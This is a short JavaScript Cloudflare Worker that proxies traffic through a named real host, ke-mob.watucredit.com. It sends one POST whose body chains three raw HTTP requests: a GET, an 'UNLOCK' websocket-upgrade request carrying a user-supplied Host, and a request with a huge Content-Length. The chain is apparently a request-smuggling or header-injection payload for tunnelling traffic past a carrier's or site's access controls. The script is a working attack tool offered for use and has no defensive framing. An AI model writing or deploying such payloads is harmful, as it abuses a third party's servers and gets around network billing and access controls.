export default {
  async fetch(request, env, ctx) {
    const proxyUrl = 'http://ke-mob.watucredit.com:80';
    
    // Get the real target from query parameter or path
    const url = new URL(request.url);
    const realHost = url.searchParams.get('real_host') || url.pathname.replace('/', '');
    
    if (!realHost) {
      return new Response('Worker is running. Add ?real_host=example.com to proxy requests.', {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    }

    // Construct the exact payload sequence
    const initialPayload = `GET /cdn-cgi/trace HTTP/1.1\r\nHost: ke-mob.watucredit.com\r\n\r\n`;
    const unlockPayload = `UNLOCK /? HTTP/1.1\r\nHost: ${realHost}\r\nConnection: upgrade\r\nUser-Agent: ${request.headers.get('user-agent') || 'Mozilla/5.0'}\r\nUpgrade: websocket\r\n\r\n`;
    const finalPayload = `UNLOCK /? HTTP/1.1\r\nHost: ke-mob.watucredit.com\r\nContent-Length: 999999999999\r\n\r\n`;

    try {
      // Forward the request through the proxy with our payload
      const proxyResponse = await fetch(proxyUrl, {
        method: 'POST',
        body: initialPayload + unlockPayload + finalPayload,
        headers: {
          'Host': 'ke-mob.watucredit.com',
          'User-Agent': request.headers.get('user-agent') || 'Mozilla/5.0',
        },
        cf: {
          // Cloudflare specific settings
          cacheEverything: false,
        }
      });
      
      return proxyResponse;
    } catch (error) {
      return new Response('Proxy error: ' + error.message, { 
        status: 500,
        headers: { 'Content-Type': 'text/plain' }
      });
    }
  }
}